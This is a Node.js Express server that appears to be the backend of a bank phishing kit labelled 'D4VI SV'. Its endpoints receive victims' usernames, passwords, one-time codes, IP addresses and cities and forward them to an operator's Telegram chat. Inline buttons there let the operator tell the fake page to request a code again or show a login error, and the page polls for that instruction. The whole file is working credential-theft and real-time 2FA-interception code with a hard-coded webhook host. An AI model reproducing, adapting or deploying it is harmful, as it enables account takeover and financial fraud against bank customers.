const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const app = express();
const FormData = require('form-data');  

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const fileUpload = require('express-fileupload');

app.use(fileUpload({
    limits: { fileSize: 10 * 1024 * 1024 }, // límite 10MB
    abortOnLimit: true,
}));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔴D4VI SV🔴
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔑🔴D4VI SV🔴
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 C0D3: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});


app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔑🔴D4VI SV🔴
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 RE-C0D3: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` },
        { text: "🗑SALIDA", callback_data: `laderrorselfi:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` },
        { text: "❌ERROR CODIGO", callback_data: `errorcode:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});




app.get('/get-status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: 'Falta txid' });
  }
  const cliente = cargarCliente(txid);
  res.json({ status: cliente ? cliente.status : 'esperando' });
});

app.post('/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      const query = update.callback_query;
      const data = query.data;
      const callbackQueryId = query.id;
      const chatId = query.message.chat.id;
      const messageId = query.message.message_id;

      console.log(`✅ Callback recibido: ${data}`);

      // 1. Responder inmediatamente al callback (quita el "cargando...")
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          // text: 'Procesado',     // opcional
          // show_alert: false,
        })
      });

      // 2. Quitar los botones del mensaje
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] }   // ← teclado vacío = desaparecen los botones
          // Alternativa: reply_markup: {}        // también suele funcionar
          // Alternativa más agresiva: reply_markup: null  (a veces da error)
        })
      });

      // 3. (Opcional) Cambiar el texto del mensaje para que quede más claro
      // await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, { ... });

      // 4. Procesar la acción como antes
      const [action, txid] = data.split(':');
      const cliente = cargarCliente(txid);
      if (cliente) {
        cliente.status = action;
        guardarCliente(txid, cliente);
        console.log(`✅ Status actualizado para ${txid}: ${action}`);
      }

      res.sendStatus(200);
    } else {
      res.sendStatus(200);
    }
  } catch (error) {
    console.error('🔥 Error en webhook:', error);
    res.sendStatus(200); // ¡Importante! Telegram exige 200 aunque haya error
  }
});

// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Servidor activo en Render puerto ${PORT}`);
  console.log('TELEGRAM_TOKEN configurado:', !!TELEGRAM_TOKEN);
  console.log('CHAT_ID configurado:', !!CHAT_ID);

  // NUEVO: Configura el webhook del bot automáticamente al iniciar
  const webhookUrl = 'https://daviyizi2-production.up.railway.app/telegram-webhook';
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${webhookUrl}`);
    const data = await res.json();
    if (data.ok) {
      console.log(`✅ Webhook configurado: ${webhookUrl}`);
    } else {
      console.log(`❌ Error configurando webhook: ${JSON.stringify(data)}`);
    }
  } catch (err) {
    console.error('🔥 Error al setear webhook:', err);
  }
});
